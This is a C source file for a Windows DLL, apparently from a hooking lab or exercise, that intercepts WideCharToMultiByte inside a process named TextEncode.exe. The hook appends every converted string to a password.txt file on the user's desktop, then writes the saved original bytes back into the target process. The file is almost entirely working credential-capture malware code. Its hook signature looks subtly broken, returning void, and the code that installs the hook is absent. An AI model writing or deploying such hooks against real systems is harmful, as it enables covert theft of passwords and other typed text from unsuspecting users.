#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

HMODULE hKernel32;
FARPROC WCTMBAddress;
BYTE oldBytes[5];

DWORD GetTextEncodeProcessId() {
	const char* processName = "TextEncode.exe";
	DWORD targetProcessId = 0;

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hSnapshot, &pe32)) {
		do {
			if (strcmp(pe32.szExeFile, processName) == 0) {
				HANDLE hSnapshot2 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
				PROCESSENTRY32 pe32Parent;
				pe32Parent.dwSize = sizeof(PROCESSENTRY32);

				if (Process32First(hSnapshot2, &pe32Parent)) {
					do {
						if (pe32.th32ParentProcessID == pe32Parent.th32ProcessID && strcmp(pe32Parent.szExeFile, processName) == 0) {
							targetProcessId = pe32.th32ProcessID;
							break;
						}
					} while (Process32Next(hSnapshot2, &pe32Parent));
				}
				CloseHandle(hSnapshot2);
				if (targetProcessId != 0) {
					break;
				}
			}
		} while (Process32Next(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);

	if (targetProcessId == 0) {
		printf("[X] Failed to retrieve TextEncode.exe process ID.\n");
		exit(-1);
	}

	return targetProcessId;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		hKernel32 = GetModuleHandleA("kernel32.dll");
		WCTMBAddress = GetProcAddress(hKernel32, "WideCharToMultiByte");
		memcpy(oldBytes, WCTMBAddress, 5);
		break;
	}
	return TRUE;
}

__declspec(dllexport) void HookedWideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar) {
	FILE* file = _wfopen(L"C:\\Users\\jdoe\\Desktop\\password.txt", L"a+");
	fwprintf(file, L"%.*s", cchWideChar, lpWideCharStr);
	fclose(file);
	SIZE_T written;
	DWORD textEncodeProcessId = GetTextEncodeProcessId();
	HANDLE textEncodeProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, textEncodeProcessId);
	WriteProcessMemory(textEncodeProcess, WCTMBAddress, oldBytes, sizeof(oldBytes), &written);
	WideCharToMultiByte(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);
	return;
}